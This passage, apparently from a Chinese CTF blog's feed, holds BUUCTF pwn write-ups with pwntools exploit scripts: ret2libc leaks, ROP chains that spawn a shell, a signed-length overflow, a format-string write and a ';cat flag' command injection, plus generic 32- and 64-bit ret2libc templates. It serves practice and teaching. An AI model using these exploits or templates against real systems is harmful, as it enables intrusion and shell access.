class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28540</span>)<br><span class="hljs-comment">#io=process(&#x27;./39&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./39&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x8c</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="40-bjdctf-2020-router"><a href="#40-bjdctf-2020-router" class="headerlink" title="40.bjdctf_2020_router"></a>40.bjdctf_2020_router</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010215930471.png" alt="image-20231010215930471"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010220101928.png" alt="image-20231010220101928"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231010220145063.png" alt="image-20231010220145063"></p><p>发现main函数中的case 1中有system函数，并且会将buf给dest的结尾，那么我们直接进入case 1，输入;cat flag指令即可</p><p>这利用了linux下的命令机制，命令1+ ; +命令2 这样的格式两种指令都会执行</p><p>所以使用 ;cat flag 可以提权</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>21~30</title>
    <link href="/2023/09/17/WP/BUUCTF/21-30/"/>
    <url>/2023/09/17/WP/BUUCTF/21-30/</url>
    
    <content type="html"><![CDATA[<h1 id="21-铁人三项-第五赛区-2018-rop"><a href="#21-铁人三项-第五赛区-2018-rop" class="headerlink" title="21.铁人三项(第五赛区)_2018_rop"></a>21.铁人三项(第五赛区)_2018_rop</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917120318310.png" alt="image-20230917120318310"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917120421671.png" alt="image-20230917120421671"></p><p>be_nice_to_people</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917120457948.png" alt="image-20230917120457948"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917120347553.png" alt="image-20230917120347553"></p><p>有read漏洞，buf可以溢出</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917123723106.png" alt="image-20230917123723106"></p><p>没有system和&#x2F;bin&#x2F;sh字符串，动态编译，堆栈保护也开了，基本确定是ret2libc方法</p><p>我们可以用main函数中的write函数泄露libc版本</p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26094</span>)<br><span class="hljs-comment">#io=process(&#x27;./21&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./21&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<span class="hljs-comment">#main_addr=0x80484c9</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">0</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br>io.sendline(payload1)<br><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libcbase=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>str_bin_sh=libcbase+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="22-bjdctf-2020-babyrop"><a href="#22-bjdctf-2020-babyrop" class="headerlink" title="22.bjdctf_2020_babyrop"></a>22.bjdctf_2020_babyrop</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917145353480.png" alt="image-20230917145353480"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917145516884.png" alt="image-20230917145516884"></p><p>init函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917151905088.png" alt="image-20230917151905088"></p><p>明示ret2libc了，那么我们就用puts函数泄露libc版本</p><p>vuln函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230917145536407.png" alt="image-20230917145536407"></p><p>read函数漏洞，可溢出</p><p>64位，用ROPgadget找到pop_rdi_ret&#x3D;0x400733</p><p>cyclic调试出偏移地址为40字节，即0x28</p><p>准备工作完成，接下来就是构造payload</p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26549</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./22&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400733</span><br>ret=<span class="hljs-number">0x4004c9</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br><br>io.sendline(payload1)<br>io.recv()<br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="21、22题总结"><a href="#21、22题总结" class="headerlink" title="21、22题总结"></a>21、22题总结</h1><h2 id="ret2libc的攻击思路"><a href="#ret2libc的攻击思路" class="headerlink" title="*ret2libc的攻击思路"></a>*ret2libc的攻击思路</h2><p>发送了一个换行符，所以要减掉0xa<br>PLT可以称作内部函数表，而GOT称为全局函数表。这两个表是相对应的，也就是PLT上的某一个函数地址就对应GOT上的一个地址<br>在第一次执行的时候，GOT表中的数据为@plt函数中下一条指令的地址，上面提到过，已加粗。<br>puts_plt为plt表puts项内容，此处相当于调用puts()</p><p>栈溢出 &#x3D;&#x3D;&gt; 调用puts、printf……函数(fun_plt_addr) &#x3D;&#x3D;&gt; 返回main函数(根据被调用函数决定带几个参数) &#x3D;&#x3D;&gt; 参数中包括泄露got表地址(fun_got_addr) &#x3D;&#x3D;&gt; 接收got表中的内容(该函数的真实地址) &#x3D;&#x3D;&gt; libc寻址找到后门函数地址 &#x3D;&#x3D;&gt; 之前返回main函数了，再栈溢出一次 &#x3D;&#x3D;&gt; 调用后门函数提权</p><p><strong>PS ：</strong>32位先调用函数，再设置函数参数；64位先在寄存器中设置好参数的值，最后再调用函数</p><h2 id="ret2libc的payload模板"><a href="#ret2libc的payload模板" class="headerlink" title="ret2libc的payload模板"></a>ret2libc的payload模板</h2><p>(1)32位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,xxxxx)<br><span class="hljs-comment">#io=process(&#x27;./xxx&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=xxx<span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">0</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libcbase=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>str_bin_sh=libcbase+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc=ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-string">libcbase=write_addr-libc.sym[&#x27;write&#x27;]</span><br><span class="hljs-string">system_addr=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-string">str_bin_sh=libcbase+next(libc.search(b&quot;/bin/sh&quot;))&#x27;&#x27;&#x27;</span><br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>(2)64位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,xxxxx)<br>elf=ELF(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=xxx<br><span class="hljs-comment">#ret=xxx#有时栈平衡会需要这个gadget凑数</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>padding=xxx<span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p64(pop_rdi_ret)+p64(puts_got)<br>payload1+=p64(puts_plt)+p64(main_addr)<br><span class="hljs-comment">#根据函数的用法来构造，如果是write函数则参考32位的方法</span><br><br>io.sendline(payload1)<br><span class="hljs-comment">#下面两行需要根据实际情况来获取泄露函数真实地址</span><br>io.recv()<br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_puts_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><span class="hljs-comment">#以下为通用操作</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc=ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-string">libcbase = puts_addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-string">system_addr=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-string">str_bin_sh=libcbase+next(libc.search(b&quot;/bin/sh&quot;))&#x27;&#x27;&#x27;</span>            <br>            <br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="关于泄露函数真实地址的接收问题"><a href="#关于泄露函数真实地址的接收问题" class="headerlink" title="关于泄露函数真实地址的接收问题"></a>关于泄露函数真实地址的接收问题</h2><p>在第八题，exp使用的是</p><blockquote><p>io.recvuntil(b”\n”)<br>puts_addr &#x3D; u64(io.recvline().strip().ljust(8,b’\0’))</p></blockquote><p>而本题用的是</p><blockquote><p>io.recv()<br>puts_addr&#x3D;u64(io.recv(6).ljust(8,’\x00’))</p></blockquote><p>还有</p><blockquote><p>read_addr&#x3D;u64(io.recvuntil(b’\x7f’).ljust(8,b’\x00’))<br>read_addr&#x3D;u64(io.recv(8))<br>read_addr&#x3D;u64(io.recv(6).ljust(8,b’\x00’))</p></blockquote><p>那么我们来分析一下不同情况下怎么接收到正确的地址</p><h3 id="理解几个不同接收函数的作用"><a href="#理解几个不同接收函数的作用" class="headerlink" title="*理解几个不同接收函数的作用"></a>*理解几个不同接收函数的作用</h3><blockquote><p>recv(numb&#x3D;字节大小, timeout&#x3D;default) : 接收指定字节数。</p><p>recvall() : 一直接收直到达到文件EOF。</p><p>recvline(keepends&#x3D;True) : 接收一行，keepends为是否保留行尾的\n。</p><p>recvuntil(delims, drop&#x3D;False) : 一直读到delims的pattern出现为止。</p><p>recvrepeat(timeout&#x3D;default) : 持续接收直到EOF或timeout。</p></blockquote><p>发送函数也顺带说了</p><blockquote><p>send(data) : 发送数据。</p><p>sendline(data) : 发送一行数据，相当于在数据末尾加\n。</p><p>sendafter()</p></blockquote><p> payload中接收时出现的一些参数解释：</p><p><code>[start:stop:step]</code>是一个切片操作，从start位置开始，stop-1位置结束，每隔step-1个字符获取一次，可以用负数表示从倒数第几个开始&#x2F;结束，step默认为1，-1表示逆向获取字符</p><blockquote><p>[0:4]接收前4个字节。</p><p>[-6:] 从倒数第6个字节开始，到字符串末尾结束</p><p>[:-6] 从头开始，到倒数第7个元素为止，不包括倒数第6个元素</p></blockquote><p>.ljust(8, b’\x00’) 是一个方法调用</p><blockquote><p>它将接收的字节后用字节 ‘\x00’ 进行填充，以确保最终的字节序列总共有8个字节，用于补全字节。</p></blockquote><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>由于32位程序的函数地址为四个字节，所以一般的接收方式为</p><blockquote><p>fun_addr&#x3D;u32(io.recv(4))#接收前4个<br>fun_addr&#x3D;u32(io.recvuntil(b’\x7f’).ljust(4,b’\x00’))#接收到\x7f即停止接收（第一个不可见字符）,用空字符填充到4字节</p></blockquote><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>由于64位程序的函数地址为8个字节，但是地址里的值就只有6位，所以我们一般只接收6位有效字节，剩下的用空字符填充</p><blockquote><p>fun_addr&#x3D;u64(io.recv(6).ljust(8,b’\x00’))#接收6个字节，用空字符填充到8位<br>fun_addr &#x3D; u64(io.recvline().strip().ljust(8,b’\0’))#接收一行，.strip()用于删除行末尾的换行符 ’\n‘，用空字符填充到8位</p></blockquote><h2 id="泄露不同函数的payload构造方法及解释（长期更新中）"><a href="#泄露不同函数的payload构造方法及解释（长期更新中）" class="headerlink" title="泄露不同函数的payload构造方法及解释（长期更新中）"></a>泄露不同函数的payload构造方法及解释（长期更新中）</h2><p>write函数</p><p>puts函数</p><p>printf函数</p><h1 id="23-bjdctf-2020-babystack2"><a href="#23-bjdctf-2020-babystack2" class="headerlink" title="23.bjdctf_2020_babystack2"></a>23.bjdctf_2020_babystack2</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918192227889.png" alt="image-20230918192227889"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918192303766.png" alt="image-20230918192303766"></p><p>看下主函数，对nbytes有限制，无法造成溢出，但是最近学的CSAPP启示了我，计算机采用补码表示负数，if语句判定的时候比较会自动将nbytes转化为有符号数比较，不管它的二进制表示，所以我们可以用负数（-1是最大的无符号数）来造成溢出，其实题目的强制转换提示的很明显了。</p><p>backdoor</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918192411300.png" alt="image-20230918192411300"></p><p>后门函数直接给了</p><p>那么本题主要考点就是计算机对负数的补码表示，其余很简单</p><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29703</span>)<br>padding=<span class="hljs-number">0x18</span><br>backdoor_addr=<span class="hljs-number">0x400726</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(<span class="hljs-number">0x400726</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Please input the length of your name:\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;What&#x27;s u name?\n&quot;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="24-jarvisoj-fm"><a href="#24-jarvisoj-fm" class="headerlink" title="24.jarvisoj_fm"></a>24.jarvisoj_fm</h1><p>格式化字符串漏洞</p><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918195021927.png" alt="image-20230918195021927"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918195007845.png" alt="image-20230918195007845"></p><p>可以看到main函数中直接就给了后门函数，同时read栈溢出漏洞也存在，但是需要x&#x3D;4时执行，跟进查看，发现x在data段，那么溢出就没法覆盖x的值了，考虑其他方法，发现printf格式化字符串漏洞也存在，尝试采用printf任意读写的特性来修改x的值</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918201114680.png" alt="image-20230918201114680"></p><p>可以看到参数在栈上存储的位置偏移为11</p><p>那么可以</p><blockquote><p>payload&#x3D;p32(x_addr)+”%11$n”</p></blockquote><p>解释一下，首先传入x参数的地址，这个地址存放在栈上偏移为11的位置，利用<code>%11$n</code>，定位到了偏移为11的位置,往这个位置写入数据，写入的数据由<code>%11$n</code>前面的参数的长度决定，而我们的x参数的地址，正好是4位，不需要添a来补齐位数就可以直接利用，将x参数的地址的值改成了4，获取了shell</p><p>但是如果需要x的值为1怎么办？</p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28625</span>)<br><br>x_addr=<span class="hljs-number">0x804A02C</span><br><span class="hljs-comment">#offset=0x8c</span><br>payload=p32(x_addr)+<span class="hljs-string">b&quot;%11$n&quot;</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="25-ciscn-2019-es-2"><a href="#25-ciscn-2019-es-2" class="headerlink" title="25.ciscn_2019_es_2"></a>25.ciscn_2019_es_2</h1><p>栈迁移(栈劫持)</p><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918203615511.png" alt="image-20230918203615511"></p><p>main</p><p><img 